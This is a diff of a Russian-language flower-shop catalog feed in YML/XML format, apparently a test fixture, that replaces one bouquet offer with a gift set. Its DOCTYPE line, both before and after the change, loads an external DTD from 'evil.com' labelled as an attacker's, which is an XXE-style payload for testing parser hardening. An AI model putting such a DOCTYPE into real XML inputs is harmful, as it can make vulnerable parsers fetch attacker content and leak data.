@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE yml_catalog SYSTEM "http://evil.com/malicious.dtd">
+<!DOCTYPE yml_catalog PUBLIC "-//Attacker//DTD Malicious//EN" "http://evil.com/malicious.dtd">
 <yml_catalog date="2025-08-15T08:13:49+02:00">
 	<shop>
 		<name>Мастер-фид для всех категорий</name>
@@ -7,7 +7,7 @@
 		<url>https://flowwow.loc</url>
 		<categories>
 			<category id="1">Цветы 1</category>
-			<category id="2">Цветы 44 сухоцвет</category>
+			<category id="3">Цветы 10 подарочные наборы</category>
 		</categories>
 		<offers>
 			<offer id="1" available="true">
@@ -17,14 +17,13 @@
 				<description>Классический букет из 5 роз</description>
 				<picture>https://cdn.pixabay.com/photo/2016/04/23/00/44/tulips-1346765_1280.jpg</picture>
 			</offer>
-			<offer id="2" available="true">
-				<categoryId>2</categoryId>
-				<name>Цветы 44 сухоцвет</name>
-				<price>1200</price>
-				<description>Букет из лаванды и хлопка</description>
-				<picture>https://cdn.pixabay.com/photo/2018/06/25/11/17/lavender-3497880_1280.jpg</picture>
+			<offer id="3" available="true">
+				<categoryId>3</categoryId>
+				<name>Цветы 10 подарочные наборы</name>
+				<price>2500</price>
+				<description>Набор с цветами и сладостями</description>
+				<picture>https://cdn.pixabay.com/photo/2017/08/06/15/34/bag-2594611_1280.jpg</picture>
 			</offer>
 		</offers>
 	</shop>
 </yml_catalog>
-
